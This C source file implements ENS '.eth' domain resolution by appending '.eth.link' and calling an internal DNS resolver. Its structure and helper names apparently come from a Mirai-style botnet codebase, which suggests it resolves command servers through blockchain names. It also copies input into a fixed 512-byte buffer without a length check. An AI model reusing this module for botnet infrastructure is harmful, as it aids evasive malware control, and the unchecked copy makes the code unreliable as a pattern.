#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>
#include <string.h>

#include "includes.h"
#include "ens.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

// Convert .eth domain to .eth.link domain for DNS resolution
// eth.link is a DNS gateway that resolves ENS names
// e.g. "jeffreyepstein.eth" -> "jeffreyepstein.eth.link"
void ens_domain_to_dns(char *dst, char *ens_domain)
{
    int len = util_strlen(ens_domain);
    util_memcpy(dst, ens_domain, len);
    util_memcpy(dst + len, ".link", 5);
    dst[len + 5] = 0;
}

// Resolve an ENS domain by appending .eth.link and using standard DNS
// This uses Cloudflare's eth.link gateway which bridges ENS -> DNS
struct resolv_entries *ens_lookup(char *domain)
{
    int domain_len = util_strlen(domain);
    
    // Check if domain ends with .eth
    if (domain_len < 4 || 
        domain[domain_len - 4] != '.' ||
        domain[domain_len - 3] != 'e' ||
        domain[domain_len - 2] != 't' ||
        domain[domain_len - 1] != 'h')
    {
        // Not a .eth domain, just do normal DNS lookup
#ifdef DEBUG
        printf("[ens] Not a .eth domain, using normal DNS: %s\n", domain);
#endif
        return resolv_lookup(domain);
    }

    // Convert "name.eth" -> "name.eth.link" and resolve via DNS
    char dns_domain[512];
    ens_domain_to_dns(dns_domain, domain);

#ifdef DEBUG
    printf("[ens] Resolving ENS domain %s via %s\n", domain, dns_domain);
#endif

    struct resolv_entries *entries = resolv_lookup(dns_domain);
    
    if (entries != NULL && entries->addrs_len > 0)
    {
#ifdef DEBUG
        printf("[ens] Successfully resolved %s to %d IPs via eth.link\n", domain, entries->addrs_len);
#endif
        return entries;
    }

    // Fallback: try direct DNS resolution without .eth.link (in case it's a regular domain)
#ifdef DEBUG
    printf("[ens] eth.link resolution failed, trying direct DNS lookup for %s\n", domain);
#endif
    return resolv_lookup(domain);
}

